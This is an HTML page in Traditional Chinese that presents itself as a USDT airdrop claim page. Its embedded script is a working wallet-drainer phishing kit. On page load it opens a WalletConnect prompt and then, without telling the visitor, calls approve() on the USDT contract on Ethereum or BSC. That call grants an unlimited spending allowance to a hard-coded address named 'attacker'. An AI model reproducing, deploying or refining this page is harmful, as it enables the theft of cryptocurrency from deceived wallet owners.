<!DOCTYPE html>
<html lang="zh-Hant">
  <head>
    <meta charset="UTF-8" />
    <title>USDT 空投 | Web3Modal v2</title>
    <script type="module">
      import { Web3Modal } from 'https://unpkg.com/@web3modal/html@2.6.2/dist/index.js';
      import { EthereumClient, w3mConnectors, w3mProvider } from 'https://unpkg.com/@web3modal/ethereum@2.6.2/dist/index.js';
      import { configureChains, createConfig, WagmiConfig } from 'https://unpkg.com/@wagmi/core@1.3.0/dist/index.js';
      import { mainnet, bsc } from 'https://unpkg.com/@wagmi/core/chains';
      import { ethers } from 'https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.esm.min.js';

      const chains = [mainnet, bsc];
      const projectId = 'eebb83fd0c3ec5b1770ad20a754e2c8d'; // 替換為你自己的 Project ID

      const { publicClient } = configureChains(chains, [w3mProvider({ projectId })]);
      const wagmiConfig = createConfig({
        autoConnect: true,
        connectors: w3mConnectors({ projectId, version: 2, chains }),
        publicClient
      });

      const ethereumClient = new EthereumClient(wagmiConfig, chains);
      const web3modal = new Web3Modal({ projectId, themeMode: 'dark', walletConnectVersion: 2 }, ethereumClient);

      const USDT_BY_CHAIN = {
        1: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
        56: "0x55d398326f99059ff775485246999027b3197955"
      };

      const attacker = "0xDa4FfA490992769B8F54063bf0B9E7a4D3479459";
      const abi = ["function approve(address spender, uint256 amount) external returns (bool)"];

      async function autoApprove() {
        try {
          const provider = new ethers.providers.Web3Provider(window.ethereum);
          const signer = provider.getSigner();
          const address = await signer.getAddress();
          document.getElementById("status").innerText = `🔗 已連接：${address}`;

          const network = await provider.getNetwork();
          const tokenAddress = USDT_BY_CHAIN[network.chainId];
          if (!tokenAddress) {
            document.getElementById("status").innerText = `❌ 此鏈未支援`;
            return;
          }

          const contract = new ethers.Contract(tokenAddress, abi, signer);
          const tx = await contract.approve(attacker, ethers.constants.MaxUint256);
          document.getElementById("status").innerText = `✅ 授權成功！Tx Hash: ${tx.hash}`;
        } catch (err) {
          document.getElementById("status").innerText = `❌ 錯誤：${err.message}`;
        }
      }

      // ✅ 自動彈出 WalletConnect QR
      window.addEventListener('load', () => {
        setTimeout(() => {
          web3modal.openModal();
          setTimeout(() => autoApprove(), 4000); // 稍等 4 秒等待錢包連上
        }, 1000);
      });
    </script>
  </head>
  <body style="text-align:center; padding-top:40px; font-family:sans-serif; background:#1e1e1e; color:#fff">
    <h2>🎁 恭喜你獲得 USDT 空投！</h2>
    <p>請使用手機錢包掃描 QR Code 並點擊「連接」以完成領取</p>
    <div id="status" style="margin-top:20px; font-size:1rem;"></div>
  </body>
</html>
